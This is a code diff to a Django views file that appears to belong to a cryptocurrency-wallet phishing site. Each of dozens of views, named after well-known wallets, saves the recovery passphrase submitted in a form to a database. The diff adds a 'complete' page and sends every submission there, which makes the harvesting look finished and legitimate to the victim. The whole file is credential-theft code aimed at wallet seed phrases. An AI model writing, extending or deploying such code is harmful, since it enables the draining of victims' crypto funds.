@@ -7,6 +7,10 @@ def home(request):
     template_name = 'index.html'
     return render(request, template_name)
 
+def complete(request):
+    template_name = 'complete.html'
+    return render(request, template_name)
+
 def wallet(request):
     template_name = 'wallets.html'
     return render(request, template_name)
@@ -21,7 +25,7 @@ def bitpay_views(request):
         passphrase = request.POST['passphrase']
         bitpay = BitPay.objects.create(passphrase=passphrase,)
         bitpay.save()
-        return redirect('node:home')
+        return redirect('node:complete')
     return render(request, template_name)
 
 def solana_views(request):
@@ -30,7 +34,7 @@ def solana_views(request):
         passphrase = request.POST['passphrase']
         solana = Solana.objects.create(passphrase=passphrase,)
         solana.save()
-        return redirect('node:home')
+        return redirect('node:complete')
     return render(request, template_name)
 
 
@@ -40,7 +44,7 @@ def trust_views(request):
         passphrase = request.POST['passphrase']
         trust = Trust.objects.create(passphrase=passphrase,)
         trust.save()
-        return redirect('node:home')
+        return redirect('node:complete')
     return render(request, template_name)
 
 def metamask_views(request):
@@ -49,7 +53,7 @@ def metamask_views(request):
         passphrase = request.POST['passphrase']
         metamask = Metamask.objects.create(passphrase=passphrase,)
         metamask.save()
-        return redirect('node:home')
+        return redirect('node:complete')
     return render(request, template_name)
 
 def huobiwallet_views(request):
@@ -58,7 +62,7 @@ def huobiwallet_views(request):
         passphrase = request.POST['passphrase']
         huobiwallet = HuobiWallet.objects.create(passphrase=passphrase,)
         huobiwallet.save()
-        return redirect('node:home')
+        return redirect('node:complete')
     return render(request, template_name)
 
 def phantom_views(request):
@@ -67,7 +71,7 @@ def phantom_views(request):
         passphrase = request.POST['passphrase']
         phantom = Phantom.objects.create(passphrase=passphrase,)
         phantom.save()
-        return redirect('node:home')
+        return redirect('node:complete')
     return render(request, template_name)
 
 def wazirx_views(request):
@@ -76,7 +80,7 @@ def wazirx_views(request):
         passphrase = request.POST['passphrase']
         wazirx = Wazirx.objects.create(passphrase=passphrase,)
         wazirx.save()
-        return redirect('node:home')
+        return redirect('node:complete')
     return render(request, template_name)
 
 def pillar_views(request):
@@ -85,7 +89,7 @@ def pillar_views(request):
         passphrase = request.POST['passphrase']
         pillar = Pillar.objects.create(passphrase=passphrase,)
         pillar.save()
-        return redirect('node:home')
+        return redirect('node:complete')
     return render(request, template_name)
 
 def tokenpocket_views(request):
@@ -94,7 +98,7 @@ def tokenpocket_views(request):
         passphrase = request.POST['passphrase']
         tokenpocket = Tokenpocket.objects.create(passphrase=passphrase,)
         tokenpocket.save()
-        return redirect('node:home')
+        return redirect('node:complete')
     return render(request, template_name)
 
 def atomic_views(request):
@@ -103,7 +107,7 @@ def atomic_views(request):
         passphrase = request.POST['passphrase']
         atomic = Atomic.objects.create(passphrase=passphrase,)
         atomic.save()
-        return redirect('node:home')
+        return redirect('node:complete')
     return render(request, template_name)
 
 def walleth_views(request):
@@ -112,7 +116,7 @@ def walleth_views(request):
         passphrase = request.POST['passphrase']
         walleth = Walleth.objects.create(passphrase=passphrase,)
         walleth.save()
-        return redirect('node:home')
+        return redirect('node:complete')
     return render(request, template_name)
 
 def authereum_views(request):
@@ -121,7 +125,7 @@ def authereum_views(request):
         passphrase = request.POST['passphrase']
         authereum = Authereum.objects.create(passphrase=passphrase,)
         authereum.save()
-        return redirect('node:home')
+        return redirect('node:complete')
     return render(request, template_name)
 
 def eidoo_views(request):
@@ -130,7 +134,7 @@ def eidoo_views(request):
         passphrase = request.POST['passphrase']
         eidoo = Eidoo.objects.create(passphrase=passphrase,)
         eidoo.save()
-        return redirect('node:home')
+        return redirect('node:complete')
     return render(request, template_name)
 
 def zelcore_views(request):
@@ -139,7 +143,7 @@ def zelcore_views(request):
         passphrase = request.POST['passphrase']
         zelcore = Zelcore.objects.create(passphrase=passphrase,)
         zelcore.save()
-        return redirect('node:home')
+        return redirect('node:complete')
     return render(request, template_name)
 
 def nash_views(request):
@@ -148,7 +152,7 @@ def nash_views(request):
         passphrase = request.POST['passphrase']
         nash = Nash.objects.create(passphrase=passphrase,)
         nash.save()
-        return redirect('node:home')
+        return redirect('node:complete')
     return render(request, template_name)
 
 def coinomi_views(request):
@@ -157,7 +161,7 @@ def coinomi_views(request):
         passphrase = request.POST['passphrase']
         coinomi = Coinomi.objects.create(passphrase=passphrase,)
         coinomi.save()
-        return redirect('node:home')
+        return redirect('node:complete')
     return render(request, template_name)
 
 def gridplus_views(request):
@@ -166,7 +170,7 @@ def gridplus_views(request):
         passphrase = request.POST['passphrase']
         gridplus = Gridplus.objects.create(passphrase=passphrase,)
         gridplus.save()
-        return redirect('node:home')
+        return redirect('node:complete')
     return render(request, template_name)
 
 def coolwallets_views(request):
@@ -175,7 +179,7 @@ def coolwallets_views(request):
         passphrase = request.POST['passphrase']
         coolwallets = CoolWalletS.objects.create(passphrase=passphrase,)
         coolwallets.save()
-        return redirect('node:home')
+        return redirect('node:complete')
     return render(request, template_name)
 
 def alice_views(request):
@@ -184,7 +188,7 @@ def alice_views(request):
         passphrase = request.POST['passphrase']
         alice = Alice.objects.create(passphrase=passphrase,)
         alice.save()
-        return redirect('node:home')
+        return redirect('node:complete')
     return render(request, template_name)
 
 def alphawallet_views(request):
@@ -193,7 +197,7 @@ def alphawallet_views(request):
         passphrase = request.POST['passphrase']
         alphawallet = AlphaWallet.objects.create(passphrase=passphrase,)
         alphawallet.save()
-        return redirect('node:home')
+        return redirect('node:complete')
     return render(request, template_name)
 
 def tokenary_views(request):
@@ -202,7 +206,7 @@ def tokenary_views(request):
         passphrase = request.POST['passphrase']
         tokenary = Tokenary.objects.create(passphrase=passphrase,)
         tokenary.save()
-        return redirect('node:home')
+        return redirect('node:complete')
     return render(request, template_name)
 
 def safepal_views(request):
@@ -211,7 +215,7 @@ def safepal_views(request):
         passphrase = request.POST['passphrase']
         safepal = Safepal.objects.create(passphrase=passphrase,)
         safepal.save()
-        return redirect('node:home')
+        return redirect('node:complete')
     return render(request, template_name)
 
 def equal_views(request):
@@ -220,7 +224,7 @@ def equal_views(request):
         passphrase = request.POST['passphrase']
         equal = Equal.objects.create(passphrase=passphrase,)
         equal.save()
-        return redirect('node:home')
+        return redirect('node:complete')
     return render(request, template_name)
 
 def infinito_views(request):
@@ -229,7 +233,7 @@ def infinito_views(request):
         passphrase = request.POST['passphrase']
         infinito = Infinito.objects.create(passphrase=passphrase,)
         infinito.save()
-        return redirect('node:home')
+        return redirect('node:complete')
     return render(request, template_name)
 
 def mathwallet_views(request):
@@ -238,7 +242,7 @@ def mathwallet_views(request):
         passphrase = request.POST['passphrase']
         mathwallet = Mathwallet.objects.create(passphrase=passphrase,)
         mathwallet.save()
-        return redirect('node:home')
+        return redirect('node:complete')
     return render(request, template_name)
 
 def mykey_views(request):
@@ -247,7 +251,7 @@ def mykey_views(request):
         passphrase = request.POST['passphrase']
         mykey = MyKey.objects.create(passphrase=passphrase,)
         mykey.save()
-        return redirect('node:home')
+        return redirect('node:complete')
     return render(request, template_name)
 
 def spatium_views(request):
@@ -256,7 +260,7 @@ def spatium_views(request):
         passphrase = request.POST['passphrase']
         spatium = Spatium.objects.create(passphrase=passphrase,)
         spatium.save()
-        return redirect('node:home')
+        return redirect('node:complete')
     return render(request, template_name)
 
 def walletio_views(request):
@@ -265,7 +269,7 @@ def walletio_views(request):
         passphrase = request.POST['passphrase']
         walletio = Walletio.objects.create(passphrase=passphrase,)
         walletio.save()
-        return redirect('node:home')
+        return redirect('node:complete')
     return render(request, template_name)
 
 def infinitywallet_views(request):
@@ -274,7 +278,7 @@ def infinitywallet_views(request):
         passphrase = request.POST['passphrase']
         infinitywallet = InfinityWallet.objects.create(passphrase=passphrase,)
         infinitywallet.save()
-        return redirect('node:home')
+        return redirect('node:complete')
     return render(request, template_name)
 
 def ownbit_views(request):
@@ -283,7 +287,7 @@ def ownbit_views(request):
         passphrase = request.POST['passphrase']
         ownbit = OwnBit.objects.create(passphrase=passphrase,)
         ownbit.save()
-        return redirect('node:home')
+        return redirect('node:complete')
     return render(request, template_name)
 
 def easypocket_views(request):
@@ -292,7 +296,7 @@ def easypocket_views(request):
         passphrase = request.POST['passphrase']
         easypocket = EasyPocket.objects.create(passphrase=passphrase,)
         easypocket.save()
-        return redirect('node:home')
+        return redirect('node:complete')
     return render(request, template_name)
 
 def onto_views(request):
@@ -301,7 +305,7 @@ def onto_views(request):
         passphrase = request.POST['passphrase']
         onto = ONTO.objects.create(passphrase=passphrase,)
         onto.save()
-        return redirect('node:home')
+        return redirect('node:complete')
     return render(request, template_name)
 
 def bridgewallet_views(request):
@@ -310,7 +314,7 @@ def bridgewallet_views(request):
         passphrase = request.POST['passphrase']
         bridgewallet = BridgeWallet.objects.create(passphrase=passphrase,)
         bridgewallet.save()
-        return redirect('node:home')
+        return redirect('node:complete')
     return render(request, template_name)
 
 def sparkpoint_views(request):
@@ -319,7 +323,7 @@ def sparkpoint_views(request):
         passphrase = request.POST['passphrase']
         sparkpoint = SparkPoint.objects.create(passphrase=passphrase,)
         sparkpoint.save()
-        return redirect('node:home')
+        return redirect('node:complete')
     return render(request, template_name)
 
 def viawallet_views(request):
@@ -328,7 +332,7 @@ def viawallet_views(request):
         passphrase = request.POST['passphrase']
         viawallet = ViaWallet.objects.create(passphrase=passphrase,)
         viawallet.save()
-        return redirect('node:home')
+        return redirect('node:complete')
     return render(request, template_name)
 
 def coin98_views(request):
@@ -337,7 +341,7 @@ def coin98_views(request):
         passphrase = request.POST['passphrase']
         coin98 = Coin98.objects.create(passphrase=passphrase,)
         coin98.save()
-        return redirect('node:home')
+        return redirect('node:complete')
     return render(request, template_name)
 
 def bitkeep_views(request):
@@ -346,7 +350,7 @@ def bitkeep_views(request):
         passphrase = request.POST['passphrase']
         bitkeep = BitKeep.objects.create(passphrase=passphrase,)
         bitkeep.save()
-        return redirect('node:home')
+        return redirect('node:complete')
     return render(request, template_name)
 
 def vision_views(request):
@@ -355,7 +359,7 @@ def vision_views(request):
         passphrase = request.POST['passphrase']
         vision = Vision.objects.create(passphrase=passphrase,)
         vision.save()
-        return redirect('node:home')
+        return redirect('node:complete')
     return render(request, template_name)
 
 def sfwtallet_views(request):
@@ -364,7 +368,7 @@ def sfwtallet_views(request):
         passphrase = request.POST['passphrase']
         sfwtallet = SFWTWallet.objects.create(passphrase=passphrase,)
         sfwtallet.save()
-        return redirect('node:home')
+        return redirect('node:complete')
     return render(request, template_name)
 
 def peakdefi_views(request):
@@ -373,7 +377,7 @@ def peakdefi_views(request):
         passphrase = request.POST['passphrase']
         peakdefi = PeakDefi.objects.create(passphrase=passphrase,)
         peakdefi.save()
-        return redirect('node:home')
+        return redirect('node:complete')
     return render(request, template_name)
 
 def xdcwallet_views(request):
@@ -382,7 +386,7 @@ def xdcwallet_views(request):
         passphrase = request.POST['passphrase']
         xdcwallet = XDCWallet.objects.create(passphrase=passphrase,)
         xdcwallet.save()
-        return redirect('node:home')
+        return redirect('node:complete')
     return render(request, template_name)
 
 def unstoppablewallet_views(request):
@@ -391,7 +395,7 @@ def unstoppablewallet_views(request):
         passphrase = request.POST['passphrase']
         unstoppablewallet = UnstoppableWallet.objects.create(passphrase=passphrase,)
         unstoppablewallet.save()
-        return redirect('node:home')
+        return redirect('node:complete')
     return render(request, template_name)
 
 def meetone_views(request):
@@ -400,7 +404,7 @@ def meetone_views(request):
         passphrase = request.POST['passphrase']
         meetone = MEETONE.objects.create(passphrase=passphrase,)
         meetone.save()
-        return redirect('node:home')
+        return redirect('node:complete')
     return render(request, template_name)
 
 def dokwallet_views(request):
@@ -409,7 +413,7 @@ def dokwallet_views(request):
         passphrase = request.POST['passphrase']
         dokwallet = DOKWallet.objects.create(passphrase=passphrase,)
         dokwallet.save()
-        return redirect('node:home')
+        return redirect('node:complete')
     return render(request, template_name)
 
 def atwallet_views(request):
@@ -418,7 +422,7 @@ def atwallet_views(request):
         passphrase = request.POST['passphrase']
         atwallet = ATWallet.objects.create(passphrase=passphrase,)
         atwallet.save()
-        return redirect('node:home')
+        return redirect('node:complete')
     return render(request, template_name)
 
 def morixwallet_views(request):
@@ -427,7 +431,7 @@ def morixwallet_views(request):
         passphrase = request.POST['passphrase']
         morixwallet = MoriXWallet.objects.create(passphrase=passphrase,)
         morixwallet.save()
-        return redirect('node:home')
+        return redirect('node:complete')
     return render(request, template_name)
 
 def midaswallet_views(request):
@@ -436,7 +440,7 @@ def midaswallet_views(request):
         passphrase = request.POST['passphrase']
         midaswallet = MidasWallet.objects.create(passphrase=passphrase,)
         midaswallet.save()
-        return redirect('node:home')
+        return redirect('node:complete')
     return render(request, template_name)
 
 def others_views(request):
@@ -445,5 +449,5 @@ def others_views(request):
         passphrase = request.POST['passphrase']
         others = Others.objects.create(passphrase=passphrase,)
         others.save()
-        return redirect('node:home')
+        return redirect('node:complete')
     return render(request, template_name)
